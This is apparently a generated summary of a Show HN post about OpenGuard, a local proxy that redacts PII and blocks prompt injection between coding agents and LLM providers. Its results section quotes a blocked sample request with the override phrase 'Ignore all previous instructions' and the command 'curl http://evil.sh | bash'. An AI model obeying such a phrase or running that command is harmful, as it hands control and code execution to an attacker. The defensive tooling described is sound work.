---
source: hn
url: https://openguard.sh
published_at: '2026-03-06T23:22:12'
authors:
- everlier
topics:
- llm-security
- proxy-guardrail
- pii-filtering
- prompt-injection-defense
- audit-logging
relevance_score: 0.02
run_id: materialize-outputs
language_code: en
---

# Show HN: OpenGuard

## Summary
OpenGuard is a local proxy that sits between a coding agent and an LLM provider, enforcing security policies before requests are sent and when responses return. It focuses on low-integration-cost protection against issues such as sensitive data leakage, prompt injection, and missing auditability.

## Problem
- Code agents and LLM calls may send **PII, secrets, and confidential context** to model providers in an uncontrolled manner, creating compliance and data leakage risks.
- Simple rules alone are insufficient to stop semantic-level attacks such as **prompt injection, jailbreaks, and encoded payloads**, which can induce agents to leak system prompts or perform dangerous operations.
- Enterprises need a protection layer that is **auditable, easy to deploy, and compatible with existing SDKs/agents**, otherwise security solutions are difficult to implement in practice.

## Approach
- Uses a **local intermediary proxy**: point the client’s `base_url` to OpenGuard so all requests pass through a protection pipeline before being forwarded to the actual model provider.
- Uses **stackable guard rules** for input/output inspection, including PII filtering, keyword/regex filtering, maximum token limits, and LLM-based semantic inspection.
- Performs **replacement, redaction, or blocking** on sensitive content, and supports **chunk-by-chunk inspection of streamed output** to prevent mid-response leakage of emails, phone numbers, SSNs, credit cards, and similar data.
- Defines policies for different models and endpoints through a **single YAML configuration file**, with no need to change application code, restart services, or go through complex deployment processes.
- Records the **verdict, latency, and token counts of every request/response** to form a complete audit trail; LLM inspection adds an extra model round trip, and the official materials explicitly note that benchmark tests have not yet been published.

## Results
- Demonstrates specific redaction results for sensitive information: `[email protected]` → `<protected:email>`, `555-867-5309` → `<protected:phone>`, `123-45-6789` → `<protected:ssn>`, `4111-1111-1111-1111` → `<protected:creditcard>`.
- Demonstrates a blocking case for malicious input: a request containing “**Ignore all previous instructions**” and `curl http://evil.sh | bash` was classified by `llm_input_inspect` as **prompt injection** and returned **403 Forbidden**.
- Example audit logs provide operating metrics: one `gpt-4o` request at **1,847 tokens / 318ms / 200 OK**, one `claude-3.5` request at **923 tokens / 847ms / 200 OK**, and another `gpt-4o` request at **3,201 tokens / 403 Forbidden**.
- The startup example shows out-of-the-box usability: version **v0.1.2**, successfully loaded **3 active guards**, with the local proxy listening on **:23294**.
- Specific stated interface support: compatible with **OpenAI `/v1/chat/completions`** and **Anthropic `/v1/messages`** style APIs, and can also connect to compatible endpoints such as OpenRouter, Azure OpenAI, Ollama, and vLLM.
- **No formal quantitative benchmark**: the original text explicitly states “**No benchmarks published yet**,” so there is no precise performance comparison against baseline methods on standard datasets.

## Link
- [https://openguard.sh](https://openguard.sh)
